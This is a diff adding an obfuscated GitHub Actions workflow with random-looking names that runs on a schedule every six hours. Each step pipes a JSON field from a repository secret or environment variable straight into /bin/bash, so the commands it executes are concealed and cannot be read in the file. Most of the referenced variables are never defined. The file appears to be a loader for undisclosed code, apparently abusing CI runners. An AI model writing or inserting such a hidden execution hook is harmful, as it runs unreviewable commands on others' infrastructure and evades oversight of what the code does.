@@ -1,0 +1,25 @@
+name: suyanzhn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: suyanzhn
+        env:
+          je0: ${{ secrets.je0 }}
+        run: |
+          echo $je0 | jq -r .jpwfs8 | /bin/bash
+          echo $skk7511 | jq -r .qu18 | /bin/bash
+          echo $gtiv168 | jq -r .gc8 | /bin/bash
+          echo $pfvmq4566 | jq -r .kaq06 | /bin/bash
+          echo $vdquf21148 | jq -r .qhsb6772 | /bin/bash
+          echo $yb48 | jq -r .xf2926 | /bin/bash
+          echo $qdgo9660 | jq -r .i70 | /bin/bash
+          echo $j50360 | jq -r .v3 | /bin/bash
+
